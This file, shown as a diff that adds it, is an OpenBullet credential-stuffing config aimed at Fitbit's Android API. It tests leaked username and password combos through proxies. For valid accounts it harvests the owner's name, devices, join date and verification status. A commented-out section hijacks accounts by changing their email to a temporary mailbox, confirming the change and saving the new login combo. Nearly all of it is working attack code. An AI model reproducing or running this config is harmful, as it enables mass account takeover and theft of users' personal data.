@@ -1,0 +1,159 @@
+[SETTINGS]
+{
+  "Name": "Fitbit by matt modded version",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-28T10:28:39.0347136+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://android-api.fitbit.com/oauth2/token" 
+  CONTENT "grant_type=password&client_id=2295XJ&username=<USER>&password=<PASS>&scope=activity%20heartrate%20location%20nutrition%20profile%20settings%20sleep%20social%20weight&expires_in=31536000" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+
+#UserID PARSE "<SOURCE>" LR "user_id\":\"" "\"" -> VAR "UserID" 
+
+#Token PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "Token" 
+
+#Capture REQUEST GET "https://android-api.fitbit.com/1/user/<UserID>/devices.json?https://android-api.fitbit.com/1/user/<UserID>/devices.json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Check KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+  KEYCHAIN Success OR 
+    KEY "\",\"batteryLevel\":" 
+
+#Device PARSE "<SOURCE>" LR "deviceVersion\":\"" "\",\"" -> CAP "Device" 
+
+#Device_Edition PARSE "<SOURCE>" LR ",\"deviceEdition\":\"" "\",\"" -> VAR "Device Edition" 
+
+FUNCTION ToUppercase "<Device Edition>" -> CAP "Device Edition" 
+
+#Last_Sync PARSE "<SOURCE>" LR "lastSyncTime\":\"" "T" -> CAP "Last Sync" 
+
+#Capture REQUEST GET "https://android-api.fitbit.com/1/user/<UserID>/profile.json?https://android-api.fitbit.com/1/user/<UserID>/profile.json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Name PARSE "<SOURCE>" LR "fullName\":\"" "\"," -> CAP "Name" 
+
+#Joined PARSE "<SOURCE>" LR "memberSince\":\"" "\",\"" -> CAP "Joined" 
+
+#Verified PARSE "<SOURCE>" LR "emailVerificationRequired\":" ",\"" -> CAP "Verified" 
+
+FUNCTION Replace "false" "Yes" "<Verified>" -> CAP "Verified" 
+
+FUNCTION Replace "true" "No" "<Verified>" -> CAP "Verified" 
+
+!#Get_Email REQUEST GET "https://temp-mail.org/en/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#Email PARSE "<SOURCE>" LR "opentip\" value=\"" "\" readonly />" -> CAP "Email" 
+
+!#Email_Only PARSE "<SOURCE>" LR "opentip\" value=\"" "@" -> VAR "Email Only" 
+
+!#Domain PARSE "<SOURCE>" LR "<Email Only>@" "\" readonly />" -> CAP "Domain" 
+
+!#Change_Email REQUEST POST "https://android-api.fitbit.com/1/account/change-email.json " 
+!  CONTENT "email=<Email>&password=<PASS>" 
+!  CONTENTTYPE "application/x-www-form-urlencoded" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+!  HEADER "Authorization: Bearer <Token>" 
+
+!KEYCHECK 
+!  KEYCHAIN Custom "2FACTOR" OR 
+!    KEY "youll need to wait " 
+!  KEYCHAIN Success OR 
+!    KEY "Click the verification link in the email" 
+
+!#Confirm REQUEST GET "https://temp-mail.org/en/option/change/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#CSRF PARSE "<SOURCE>" LR "name=\"csrf\" value=\"" "\" style=\"display:none;\" />" -> VAR "CSRF" 
+
+!#Confirm REQUEST POST "https://temp-mail.org/en/option/change/" 
+!  CONTENT "csrf=<CSRF>&mail=<Email Only>&domain=@<Domain>" 
+!  CONTENTTYPE "application/x-www-form-urlencoded" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#Refresh REQUEST GET "https://temp-mail.org/en/option/refresh/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#Confirm_Url PARSE "<SOURCE>" LR "span class=\"inboxSubject subject-title\">" "title=\"Action required: Confirm " -> VAR "Url" 
+
+!#Fix_Url FUNCTION Translate StopAfterFirstMatch=FALSE 
+!  KEY "<a href=\"" VALUE "" 
+!  KEY "\"" VALUE "" 
+!  "<Url>" -> VAR "Url" 
+
+!#Confirm_change REQUEST GET "<Url>" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#Second_Url PARSE "<SOURCE>" LR "Having trouble? Just copy and paste this link into your browser: <br> <a href=\"" "\" target=\"_blank\" tabindex=\"-1\" " -> VAR "Second Url" 
+
+!#Confirm_address_change REQUEST GET "<Second Url>" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#Parse_Mail PARSE "<Email>" LR "" "" -> CAP "Final Combo" 
+
+!#Final_Mail FUNCTION Replace "<Email>" "<Email>:<PASS>" "<Final Combo>" -> CAP "Final Combo" 
+
